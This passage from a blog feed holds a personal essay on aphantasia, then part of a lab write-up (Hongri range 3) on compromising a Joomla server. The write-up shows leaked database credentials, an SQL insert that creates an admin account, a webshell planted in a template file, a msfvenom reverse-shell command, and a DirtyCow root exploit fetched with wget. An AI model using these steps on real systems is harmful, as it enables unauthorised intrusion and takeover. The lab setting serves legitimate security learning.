<p>如果有人，一脸惊吓的告诉我，他看见鬼了，我是会相信的，什么是真实的？我的理解是“真实”只存在于每个人自己的脑海中，而外界的一切都只是一种共识，这种共识产生是因为我们大部分人都拥有相近的感官体验，都处于正态分布的中间区域，我们看见的，听见的，尝到的，这些体验都很相近，但是实际上每个人的感受都是不同的，我们讨论的都只是一种共识。举个例子，我们大多数人的眼睛里面只有三种感色细胞，感知红绿蓝，但是有一部分人，拥有第四种感色细胞，对黄绿色光谱具有特别的敏感性。对于这类人来说，可以分辨出更多的颜色，这类人的世界就与一般人的存在差别。只是因为这类人占少数，无法形成一个广泛的共识，因此他们眼中的世界不是“真实”的。这个看见鬼的人，确确实实是在那一刻或者那一小段时间感知到了“鬼”，只不过这只是他自己的个人体验而已。</p></blockquote>
<p>回到tupla。在知道有这么一个东西之后，我就去搜索入门教程，在查阅的时候，他们提到有一部分人无法创造tupla，给出了心盲症这一概念，我简单搜索了一下这个概念，我现在只记得我当时是被震惊到了（除了这一描述之外，现在的我对此回忆不出来任何感受），原来其他人闭上眼睛是真的能看见东西的，别人是真的能在脑海里像放电影一样回忆过去。</p>
<p>震惊之后，去问高中的好兄弟，询问他闭上眼睛能否看见什么。他的回答也是no。（也许正是因此，才建立起来比较强的连接）</p>
<p>于是我又去问了另外一个高中时候的朋友，（我是相信她一定能够在脑海中看见的，因为她能将事情描述的很生动。），交流之后再把结果告诉了一下好兄弟，他也震惊了。当时我对心盲症还没有什么了解，将这个归因成了右脑使用少了。在这个想象力丰富的朋友的建议下，我开始了两三个月左手吃饭练习（那段时间刚开始折腾双拼输入法，折腾左手吃饭也是折腾，就开始练习了）。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e6%82%a3%e6%9c%89%e5%bf%83%e7%9b%b2%e7%97%87%e6%98%af%e4%b8%80%e7%a7%8d%e6%80%8e%e6%a0%b7%e7%9a%84%e4%bd%93%e9%aa%8c_image_5.png" alt="|250"  /></p>
<p>后面随着时间的推移，我停止了对心盲症的探索（这与我当时对心盲症的悲观态度有关），只是知道了人和人在感官体验上有很大差别。</p>
<p>几乎是一年之后，随着我对佛法开始产生兴趣，（从冥想到禅定再到佛法），在学习禅定理论，进行禅定练习的时候，遇见了一些困难，我没法选择那些需要感官想象的所缘，作为我的专注对象，于是我又回到了心盲症，陆陆续续一个月时间，翻了不少国外的心盲症的文章，看了一本讲心盲症的英文书籍，想着了解了这么多了，我需要输出一点什么，现实生活中又充满了沉默了，就只能在网上写写了，于是翻新了一下博客，计划了这篇文章。</p>
<h2 id="心盲症me">心盲症&amp;me</h2>
<p>心盲症塑造了我，我并非是从某个时刻开始失去了感官想象能力，而是从出生起，一直都是。</p>
<h3 id="心盲">心盲</h3>
<p>我在闭上眼睛之后，脑海里面无论怎样做意，都无法看见任何东西。</p>
<p>我无法回忆起来我家，我的房间，我在学校里面的宿舍；出去旅游，回来之后，除了留下的照片，我再也不能回忆起来任何场景。</p>
<p>心盲症并不影响我识别人脸的功能，当我遇见熟人的时候，我能够认出来，但是当换了生活场景之后，身边的朋友，哪怕之前是每天都见到，我的脑子里就再也不会出现这个人的模样。</p>
<p>更加令我绝望的是，我的脑海里从来都没有出现过我亲人的模样，在我知道心盲症之前，我认为这是正常的，但是这实际上这不是正常的。</p>
<h3 id="多感官想象障碍">多感官想象障碍</h3>
<p>多感官想象障碍在心盲症里面的占比大约有四分之一[5]，而我正好是这四分之一。</p>
<p>我不能想象味觉，吃过的食物，只有在吃的当下时刻，我能够感受到食物的味道，但是在这之后，我无法回忆起来食物的味道，当然我还是可以描述食物的味道，但是这只是文字描述，不是感官体验（这种文字描述也能引起我对食物的生理反应）。</p>
<p>基于这样子的体验，对我来说，我并不在意吃什么样的食物，吃大餐与吃拼好饭对我来说没有太多的区别，如果有能够满足人体能量需求的营养液出现，那我肯定会投身这种科技造物。我也学习了一下怎么从吃中获得乐趣，但是这种乐趣是基于正念的，我必须全身心的投入到当下的感觉，把注意力放到我与筷子的接触，筷子与食物的接触，食物的颜色，食物送到我的嘴边时我嗅觉，食物进入口腔之后的味觉，咀嚼的感受，吞咽的感受。通过这些，我能够从食物中获取乐趣。</p>
<p>我无法回忆起声音，脑子里从来都没有出现过亲人，朋友的声音。听音乐之后记不住旋律，放下耳机，脑海就不会有任何音乐，因为这个特性加上一点点声乐启蒙的缺失，我与音乐世界注定无缘。（这里更多的是早期声乐启蒙的缺失导致的，我的好兄弟在音乐方面的能力是正常的。）</p>
<p>其他的感觉，像触觉，嗅觉，运动感我也都不能想象出来，这些感官的缺失带给我的负面影响还有待我去觉察。总之是少了很多感官层面的快乐。</p>
<hr>
<h3 id="想象力">想象力</h3>
<p>心盲症者同样拥有想象力，只不过想象力不是以感官的形式存在的，同样可以做白日梦。</p>
<p>我的想象力是由概念，文字组成的，而不是图像的，其他感官的，更加依赖于逻辑。</p>
<p>让我想象我在江边钓鱼，我需要尽可能的去从一个概念联想到另外一个相关的概念，从而激活与这个情景相关的概念网络，江边，江水，江风，钓鱼，鱼竿，饵料，打窝&hellip;在一边激活这些概念的时候，脑子里就在进行一些隐形的推理，将这些概念给组织起来，形成一个概念网络，抽象情景。（我往往察觉不到这个联想，推理的过程）
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e6%82%a3%e6%9c%89%e5%bf%83%e7%9b%b2%e7%97%87%e6%98%af%e4%b8%80%e7%a7%8d%e6%80%8e%e6%a0%b7%e7%9a%84%e4%bd%93%e9%aa%8c_image_6.png" alt="|400"  />
我看了很多年的网络小说，也看了一些经典文学，在阅读的时候我同样也会想象，会代入，也会感动，但是在阅读的时候看不到任何画面，有的只是概念，文字。</p>
<h3 id="回忆情感">回忆情感</h3>
<p>由于回忆感官的能力受到了影响，自然而然的，心盲症者在回忆情感的时候，会更加困难。</p>
<p>这里我解释一下这个自然而然，我并不知道这样的解释是否准确，因为我一直都是心盲症，没有心盲症之外的视角。</p>
<blockquote>
<p>当你在进行情感回忆时，往往是先在脑海里构建出来了一个情景，情景触发心境。这个情景在过去曾经触发过你的一些情绪，情感，你的脑子里面存储了这个情景到心境的联系，所以当你再次在脑海里面主动的构建好相应的情景，找到了那个的心境，就很容易触发出情感。（如果存在一些莫名的伤感，触景生情，很有可能是因为这个构建过程在潜意识中隐形的完成了）。
而心盲症者在构建情景的时候，没有感官层面的细节，是依靠语义来构建的情景，是不能在脑海中很好的构建出过去的那个情景，只是构建了一个抽象的情景出来，从而就<em>不能很高概率</em>的触发相应的心境，不能很高概率的回忆起过去的情感</p></blockquote>
<p>心盲症者并不是完全不能回忆过去的情绪情感，只不过需要一些铺垫，我的理解是，我无法主动想象出来的那部分情景，需要依靠外界环境和潜意识来构建，当这部分铺垫在机缘巧合在完成之后，我再去回忆过去的事情的时候，就能够很快的陷进情绪中。</p>
<h3 id="自传式记忆">自传式记忆</h3>
<p>关于我人生中的重要事情，节点的回忆</p>
<p>有了上面的一些描述，这一点就更容易表达出来了，当我回忆我过去的重要的，强烈情感的事情，往往都是文字的，概念的，抽象的。这个体验跟我在看网络小说时，阅读别人的故事没有太多的差别，我不是每次回忆过去时，都能回忆起当时的情绪（这个回忆的情景本身就是抽象的）。我对我过去中那些发生的事情，并没有很强的“<strong>这是我过去做过的事情</strong>”的感觉，我并没有一个很强的自我感。借用史铁生在《务虚笔记》中的比喻，这些我过去发生的事情对我来说只是一个<strong>传说</strong>。</p>
<p>基于这样子的体验，我常常感到荒谬，我为什么会在这里，我只是莫名其妙的就来到了这里。</p>
<h2 id="上帝爱我">上帝爱我</h2>
<p>原本的标题是“心盲症是在教我会什么”，但是在上面引用到史铁生之后，我想起了他在《好运设计》这篇文章中结尾的文字，须知<strong>上帝爱我</strong>。</p>
<h3 id="顿感力">顿感力</h3>
<p>过去的美好的事情，我无法回忆，同样，过去的那些痛苦的，阴郁的情绪，情感我也回忆不起来，我完全不会在脑海里面不断重放自己的尴尬时刻。</p>
<p>看恐怖片，只有在看的当下会恐惧，在那之后不会非常恐惧，虽然回想起来那些概念还是会有一点害怕（我还能想起来概念之一是‘楼梯转角处的小女孩壁画’），但是并没有非常强烈的恐惧。</p>
<p>极度恶心的，反胃的事情，我也都回忆不出来，我最近阅读过尸体变化图鉴，一部分是看的黑白的（使用墨水屏），一部分是彩色的，在阅读的时候也会恶心，但是在结束之后，是没有什么反应的。看完之后我还是正常的吃饭睡觉，并不能想象自己像尸体一样腐烂，更不能在自己的身体上看到小可爱，看到巨人观，更不用说把自己看成骷髅了。（我是在验证佛教中的白骨观，不净观对治贪欲这一修法，还好我是心盲症，不然确实是很扭曲人性的行为。）</p>
<h3 id="多拍照多记录">多拍照，多记录</h3>
<p>没办法回忆过去的景色，声音，于是就更加需要借助现代科技来保存感官回忆，更加需要拍照，拍视频，写日记，更加需要在博客中输出文章。</p>
<p>等到脑机接口技术再发展一段时间，心盲症患者说不定也能借助脑际接口，将脑海中的想象给图形化。</p>
<h3 id="无我无我所">无我，无我所</h3>
<p>没有一个强烈的自我感，这正好就与佛法的核心，无我相切合。也许正是这样的体验，让我有了认同原始佛法的基础</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e6%82%a3%e6%9c%89%e5%bf%83%e7%9b%b2%e7%97%87%e6%98%af%e4%b8%80%e7%a7%8d%e6%80%8e%e6%a0%b7%e7%9a%84%e4%bd%93%e9%aa%8c_image_7.png" alt="|300"  /></p>
<p>无我指的是没有一个根本的，永恒不变的‘我’，自我是在不断的变化，变异，当现在这个‘我’，想要获取A，想要做B,但是随着因缘变化，‘我’在不断改变，之前让我辗转不可得的A，B，也就不那么重要了。当下的这个‘我’的形成是依赖于很多外部的条件（因缘），因缘的生灭是我们把控不了的，所以悉达多得到了无我的结论。（这只是一个基于因缘法的证明思路，我还只是佛学的初学者，并且在边学边对佛教，佛法祛魅。我并不相信大乘佛教，没有灵魂，没有线性轮回，轮回是你死后变成答辩，悉达多并不知道地球是圆的。）论证了无我的结论，没有一个不变的我，那么我所拥有的东西，即我所，那也就不是什么值得执着的东西了。</p>
<h3 id="活在当下">活在当下</h3>
<p>心盲症者缺失了内在的感官幻想，也就不容易陷入幻想中，更加容易实践活在当下这一智慧。</p>
<p>（下面这些转换，是我在学习正念，学习禅定，学习佛法过程中零零碎碎的领会到的，还并不能做到）</p>
<p>我不能回忆起别人的面孔，可以重塑成，当我每次看见熟人的时候，我都要集中注意的，认真的去记住这个人的模样，因为我知道当我的视线离开之后，我就再也不能在脑海里面回忆起来了。我知道了注定会缘灭，就更加的明白了因缘和合是多么的不容易，于是更加珍惜当下的会面，把每次一次会面都当作最后一次来珍惜。（需要我是充满能量的，去主动的刻意的调动注意力，不然就会进入默认模式）</p>
<p>我不能回忆过去看到的景象，声音，味觉，嗅觉，便需要专注于当下的眼睛看到的，我需要正念，专注在当下的感受，觉察我现在看见了什么，看见的事物在我身体上引起了什么感受，在我的内心引起了什么样的念头，我听见了什么，听见的声音在我身体层面上引起了什么感受，在我的内心引起了什么样的念头，我闻到了什么味道，闻到的味道&hellip;&hellip;.，尽可能的把心安放在当下。</p>
<h2 id="心盲症是残疾吗">心盲症是残疾吗</h2>
<p>是吗？</p>
<p>残疾的定义</p>
<blockquote>
<p>根据《联合国残疾人权利公约》CRPD第一条宗旨：释义为残疾人即肢体、语言、听力、精神、智力或多重存在长期缺损的人，这些缺损与各种障碍相互作用，或可阻碍残疾人与健全人一样在平等的基础上充分和切实地参与社会。</p></blockquote>
<p>在我刚知道心盲症的时候，我确实是认为这是残疾，百分之四的比例，我就是这么的不幸，我总是如此不幸，而且也就该如此；但是这只是因为我对心盲症，对我的脑子，对残疾的概念并没有那么了解，是因为无明（不知道事情背后的因缘），才这样认为的。（当然，在我阅读的资料中，确实有人强烈的认同这是残疾，那么这对于这个人来说，就是残疾，真实只存在于脑中）</p>
<p>这只是一种神经多样性。回到几百万年以前，当我还生活在洞穴里面的时候，我是一个患有心盲症的野人，由于我缺乏视觉想象能力，很难记住路线，因此不太可能是狩猎队中的队长式的角色，但是因为我更容易克服来自感官想象的恐惧，也许我更能打出致命伤。这里我使用ai继续了这个想象。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e6%82%a3%e6%9c%89%e5%bf%83%e7%9b%b2%e7%97%87%e6%98%af%e4%b8%80%e7%a7%8d%e6%80%8e%e6%a0%b7%e7%9a%84%e4%bd%93%e9%aa%8c_image_8.png" alt="|550"  /></p>
<p>心盲症，是神经多样性，从进化论的角度来说，心盲症不是一个致命的性状，是中性的。几百万年前的心盲症患者并没有因为心盲症在自然选择中被淘汰，心盲症相关的基因并没有受到强烈的自然选择力量的作用，从而一直延续到了现在。</p>
<h1 id="l1uyun">l1uyun</h1>
<p>在我学会思考之前，我就已经是多感官想象障碍者了。</p>
<p>在现实生活中，很难有机会把对我心盲症的了解，理解说出来，一方面是很难在短时间内组织清楚，另一方面是现实中也没地方可以说，所以就在博客中说出来吧。</p>
<h1 id="引用">引用</h1>
<p>[1] <a href="https://aphantasia.com/what-is-aphantasia" target="_blank" rel="noopener nofollow noreferrer" >https://aphantasia.com/what-is-aphantasia</a></p>
<p>[2] <a href="https://www.thepaper.cn/newsDetail_forward_13478000" target="_blank" rel="noopener nofollow noreferrer" >https://www.thepaper.cn/newsDetail_forward_13478000</a></p>
<p>[3] <a href="https://aphantasia.com/article/strategies/ball-on-the-table/" target="_blank" rel="noopener nofollow noreferrer" >https://aphantasia.com/article/strategies/ball-on-the-table/</a></p>
<p>[4] <a href="https://www.uni-bonn.de/en/news/044-2024" target="_blank" rel="noopener nofollow noreferrer" >https://www.uni-bonn.de/en/news/044-2024</a></p>
<p>[5] <a href="https://www.nature.com/articles/s41598-020-65705-7/" target="_blank" rel="noopener nofollow noreferrer" >https://www.nature.com/articles/s41598-020-65705-7/</a></p>
<p>另外还参考了
Aphantasia Experiences, Perceptions, and Insights (Alan Kendle)</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/l1uyun" term="l1uyun" label="l1uyun" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[红日靶场3]]></title>
            <link href="https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA3/" rel="alternate" type="text/html" />
            
                <id>https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA3/</id>
            
            
            <published>2024-10-07T21:20:16+08:00</published>
            <updated>2024-10-09T14:36:06+08:00</updated>
            
            
            <content type="html"><![CDATA[<h1 id="前言">前言</h1>
<p>得加快红日靶场的进度了</p>
<h1 id="红日靶场3">红日靶场3</h1>
<h2 id="搭建环境">搭建环境</h2>
<p>这个靶场只有一台web服务器暴露在外网中</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>外网网段 192.168.3.1/24
</span></span><span style="display:flex;"><span>攻击机 parrot 192.168.3.101
</span></span><span style="display:flex;"><span>攻击机 wsl  192.168.3.100
</span></span><span style="display:flex;"><span>攻击机 win  192.168.3.99
</span></span><span style="display:flex;"><span>web-centos 192.168.3.3
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>内网网段
</span></span><span style="display:flex;"><span>192.168.93.1/24
</span></span></code></pre></div><p>五台靶机都是配置了only-host网卡,除了centos额外有一个nat网卡,来与外网通信.
启动centos靶机之后,需要<code>service network restart</code></p>
<blockquote>
<p>[!INFO]
配完环境之后,发现忘了弄快照了,可能不会在一个完整的时间内完成,所以&hellip;.重新解压一下,改完网卡后,先弄下快照</p></blockquote>
<h2 id="外网">外网</h2>
<p>访问192.168.3.3</p>
<h3 id="信息收集">信息收集</h3>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_1.png" alt=""  />
joomla cms
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_2.png" alt=""  />
这个cms之前打靶机的时候遇见过
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_3.png" alt=""  />
在README.txt中发现了版本信息(在http://192.168.3.3/administrator/manifests/files/joomla.xml中也有)
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_4.png" alt=""  />
在exploit-db中查找一下,先看看两个sql注入,RealEstateManager和VehicleManager组件的,但是这台机器,这两个组件都没有</p>
<p>后台弱口令登录失败,跑一下爆破脚本</p>
<p>继续找一下nday,尝试了一下,没啥进展</p>
<h3 id="数据库凭据泄露">数据库凭据泄露</h3>
<p>回到目录扫描
御剑扫一下
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_5.png" alt=""  />
phpinfo
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_6.png" alt=""  />
电脑卡起来了,御剑崩了,换成dirsearch,扫到了下面这个文件
<code>http://192.168.3.3/configuration.php~</code>
里面有数据库的账号密码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>	public $dbtype <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mysqli&#39;</span>;
</span></span><span style="display:flex;"><span>	public $host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>;
</span></span><span style="display:flex;"><span>	public $user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;testuser&#39;</span>;
</span></span><span style="display:flex;"><span>	public $password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;cvcvgjASD!@&#39;</span>;
</span></span><span style="display:flex;"><span>	public $db <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;joomla&#39;</span>;
</span></span><span style="display:flex;"><span>	public $dbprefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;am2zu_&#39;</span>;
</span></span></code></pre></div><p>navicat连一下
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_7.png" alt=""  /></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>admin
</span></span><span style="display:flex;"><span>$2y$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>administrator
</span></span><span style="display:flex;"><span>$2y$10$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2
</span></span></code></pre></div><p>bcrypt加密</p>
<h3 id="sql添加管理员">sql添加管理员</h3>
<p>没跑出来,<a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn" target="_blank" rel="noopener nofollow noreferrer" >添加一个新用户算了</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> <span style="color:#f92672">`</span>am2zu_users<span style="color:#f92672">`</span>
</span></span><span style="display:flex;"><span>   (<span style="color:#f92672">`</span>name<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>username<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>password<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>params<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>registerDate<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>lastvisitDate<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>lastResetTime<span style="color:#f92672">`</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;Administrator2&#39;</span>, <span style="color:#e6db74">&#39;admin2&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, NOW(), NOW(), NOW());
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> <span style="color:#f92672">`</span>am2zu_user_usergroup_map<span style="color:#f92672">`</span> (<span style="color:#f92672">`</span>user_id<span style="color:#f92672">`</span>,<span style="color:#f92672">`</span>group_id<span style="color:#f92672">`</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">VALUES</span> (LAST_INSERT_ID(),<span style="color:#e6db74">&#39;8&#39;</span>);
</span></span></code></pre></div><p>然后使用admin2:secret登录进入后台
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_8.png" alt=""  /></p>
<h3 id="后台模板getshell">后台模板getshell</h3>
<p>上传webshell,这里生成的是蚁剑的
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_9.png" alt="|500"  />
修改error.php,并保存
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_10.png" alt=""  />
路径是<code>http://192.168.3.3/templates/beez3/error.php</code></p>
<h3 id="antsword">antsword</h3>
<p>连上去了
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_11.png" alt=""  />
加载插件之后执行命令
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_12.png" alt=""  />
存在内网ip 192.168.93.120</p>
<p>传到msf里面吧</p>
<pre tabindex="0"><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.3.100 LPORT=4444 -f elf -o shell.elf
</code></pre><p>没传成功&hellip;.尝试了很多反弹shell的操作,但是都没有弹成功
最后在tmp目录下发现了凭据,前期已经知道了ssh是开放的,连上去</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -o HostKeyAlgorithms<span style="color:#f92672">=</span>+ssh-rsa -o PubkeyAcceptedAlgorithms<span style="color:#f92672">=</span>+ssh-rsa wwwuser@192.168.3.3
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>wwwuser_123Aqx
</span></span></code></pre></div><p>ssh连上去之后上linpeas脚本,看到了这个nginx配置文件,明白是什么意思了,我拿到的webshell是在内网的192.168.93.120机器上面,而我现在的靶机的内网ip是192.168.93.100,所以我反弹不了web机器的shell回来,有公网ip的这台nginx机器是反向代理了内网的web机器</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-rw-r--r--. <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1032</span> Oct  <span style="color:#ae81ff">6</span> 20:09 /etc/nginx/nginx.conf
</span></span><span style="display:flex;"><span>user  nginx;
</span></span><span style="display:flex;"><span>worker_processes  1;
</span></span><span style="display:flex;"><span>error_log  /var/log/nginx/error.log warn;
</span></span><span style="display:flex;"><span>pid        /var/run/nginx.pid;
</span></span><span style="display:flex;"><span>events <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    worker_connections  1024;
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>http <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  server <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        listen  80;
</span></span><span style="display:flex;"><span>        server_name  localhost;
</span></span><span style="display:flex;"><span>        location / <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>         proxy_pass  http://192.168.93.120;
</span></span><span style="display:flex;"><span>              proxy_set_header        Host $host;
</span></span><span style="display:flex;"><span>              proxy_connect_timeout   90;
</span></span><span style="display:flex;"><span>              proxy_send_timeout      90;
</span></span><span style="display:flex;"><span>              proxy_read_timeout      90;
</span></span><span style="display:flex;"><span>              proxy_buffer_size       4k;
</span></span><span style="display:flex;"><span>              proxy_buffers           <span style="color:#ae81ff">4</span> 32k;
</span></span><span style="display:flex;"><span>              proxy_busy_buffers_size 64k;
</span></span><span style="display:flex;"><span>              proxy_temp_file_write_size 64k;
</span></span><span style="display:flex;"><span>              proxy_redirect          off;
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>stream  <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>upstream proxy_name <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    server 192.168.93.120:3306;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>server <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    listen 3306;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    proxy_pass proxy_name;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><h3 id="提权">提权</h3>
<p>接下来要对内网的机器进一步渗透,这台公网机器需要作为跳板机,先得拿下root</p>
<p>尝试一下脏牛
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_13.png" alt=""  /></p>
<p>上传.c文件,将文件里面的用户名改成root</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>wwwuser@localhost tmp<span style="color:#f92672">]</span>$ wget 192.168.3.100/dirty.c
</span></span><span style="display:flex;"><span>--2019-10-06 22:57:45--  http://192.168.3.100/dirty.c
</span></span><span style="display:flex;"><span>Connecting to 192.168.3.100:80... connected.
</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">4807</span> <span style="color:#f92672">(</span>4.7K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/x-csrc<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Saving to: “dirty.c”
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>100%<span style="color:#f92672">[================================================</span>&gt;<span style="color:#f92672">]</span> 4,807       --.-K/s   in 0s      
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2019-10-06 22:57:45 <span style="color:#f92672">(</span>11.1 MB/s<span style="color:#f92672">)</span> - “dirty.c” saved <span style="color:#f92672">[</span>4807/4807<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wwwuser@localhost tmp<span style="color:#f92672">]</span>$ gcc -pthread dirty.c -o dirty -lcrypt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wwwuser@localhost tmp<span style="color:#f92672">]</span>$ ls -al ./dirty
</span></span><span style="display:flex;"><span>-rwxrwxr-x. <span style="color:#ae81ff">1</span> wwwuser wwwuser <span style="color:#ae81ff">12056</span> Oct  <span style="color:#ae81ff">6</span> 22:57 ./dirty
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wwwuser@localhost tmp<span style="color:#f92672">]</span>$ ./dirty 
</span></span><span style="display:flex;"><span>/etc/passwd successfully backed up to /tmp/passwd.bak
</span></span><span style="display:flex;"><span>Please enter the new password: 
</span></span><span style="display:flex;"><span>Complete line:
</span></span><span style="display:flex;"><span>root:roNJMEIcMPy4.:0:0:pwned:/root:/bin/bash
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mmap: 7f6fb884c000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wwwuser@localhost tmp<span style="color:#f92672">]</span>$ su root
</span></span><span style="display:flex;"><span>Password: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@localhost tmp<span style="color:#f92672">]</span><span style="color:#75715e"># id</span>
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> context<span style="color:#f92672">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span></span></code></pre></div><p>拿下root,将shell传到msf中,<a href="https://www.revshells.com" target="_blank" rel="noopener nofollow noreferrer" >msfvenom</a>
